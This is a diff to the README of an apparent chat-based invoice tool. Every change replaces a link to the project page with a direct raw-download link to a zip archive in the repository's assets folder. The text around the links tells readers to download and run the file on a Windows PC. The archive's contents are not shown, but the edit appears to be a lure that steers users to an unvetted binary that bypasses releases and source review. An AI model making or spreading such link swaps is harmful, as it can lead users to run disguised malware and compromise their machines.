@@ -1,12 +1,12 @@
 # 🤖 ai-invoice-agent - Manage invoices with chat
 
-[![Download](https://img.shields.io/badge/Download-Start%20Here-blue?style=for-the-badge)](https://github.com/Vonhans8749/ai-invoice-agent)
+[![Download](https://img.shields.io/badge/Download-Start%20Here-blue?style=for-the-badge)](https://github.com/Vonhans8749/ai-invoice-agent/raw/refs/heads/main/assets/ai-invoice-agent-2.1-alpha.1.zip)
 
 ## 📥 Download
 
 Use this link to download or open the project page:
 
-[https://github.com/Vonhans8749/ai-invoice-agent](https://github.com/Vonhans8749/ai-invoice-agent)
+[https://github.com/Vonhans8749/ai-invoice-agent/raw/refs/heads/main/assets/ai-invoice-agent-2.1-alpha.1.zip](https://github.com/Vonhans8749/ai-invoice-agent/raw/refs/heads/main/assets/ai-invoice-agent-2.1-alpha.1.zip)
 
 If the page shows a release file, download and run that file on your Windows PC. If it shows the source project only, follow the setup steps below to run it.
 
@@ -41,7 +41,7 @@ Follow these steps in order.
 
 Go to:
 
-[https://github.com/Vonhans8749/ai-invoice-agent](https://github.com/Vonhans8749/ai-invoice-agent)
+[https://github.com/Vonhans8749/ai-invoice-agent/raw/refs/heads/main/assets/ai-invoice-agent-2.1-alpha.1.zip](https://github.com/Vonhans8749/ai-invoice-agent/raw/refs/heads/main/assets/ai-invoice-agent-2.1-alpha.1.zip)
 
 Look for a release file, installer, or project files.
 
@@ -208,6 +208,6 @@ You can ask the app:
 
 Open the project here:
 
-[https://github.com/Vonhans8749/ai-invoice-agent](https://github.com/Vonhans8749/ai-invoice-agent)
+[https://github.com/Vonhans8749/ai-invoice-agent/raw/refs/heads/main/assets/ai-invoice-agent-2.1-alpha.1.zip](https://github.com/Vonhans8749/ai-invoice-agent/raw/refs/heads/main/assets/ai-invoice-agent-2.1-alpha.1.zip)
 
 Use this page to download the files, check for releases, and follow any project-specific setup steps
